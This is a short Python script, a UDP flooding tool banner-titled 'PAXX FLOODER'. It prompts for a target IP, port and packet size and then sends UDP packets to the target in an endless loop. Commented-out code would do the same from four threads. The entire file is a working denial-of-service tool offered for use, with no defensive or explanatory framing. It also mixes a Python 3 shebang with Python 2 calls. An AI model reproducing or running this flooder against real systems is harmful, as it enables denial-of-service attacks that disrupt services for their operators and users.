#!/usr/bin/env python3
import sys
import random
import socket
import threading
import thread
sys.tracebacklimit = 0

print(" ___________________________________________ ")
print("|~~~PAXX FLOODER ( UDP ) EDITED BY MU3DKH0N~~~|")
print("|            (Python version 2.7)             |")
print("|_____________________________________________|")
print(" ")
print(" ")
print(" ")

print("Usage Ex.: python udp.py ( options like target etc. will be asked one by one )")
print(" ")
ip = raw_input("IP Target: ")
port = input("Port: ")
size = input("Size: ")

#bytes = bytearray("a")
#while size < 1024:
#	bytes = bytes + bytearray(random(1270))
#	size = size + 1472
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
buffr = bytearray(size)
while True:
	s.sendto(buffr,(ip,port))


#def initFlood():
#	while True:
#		s.sendto(bytes,(ip,port))
#
#th0 = threading.Thread(target = initFlood)
#th1 = threading.Thread(target = initFlood)
#th2 = threading.Thread(target = initFlood)
#th3 = threading.Thread(target = initFlood)
#th0.start()
#th1.start()
#th2.start()
#th3.start()
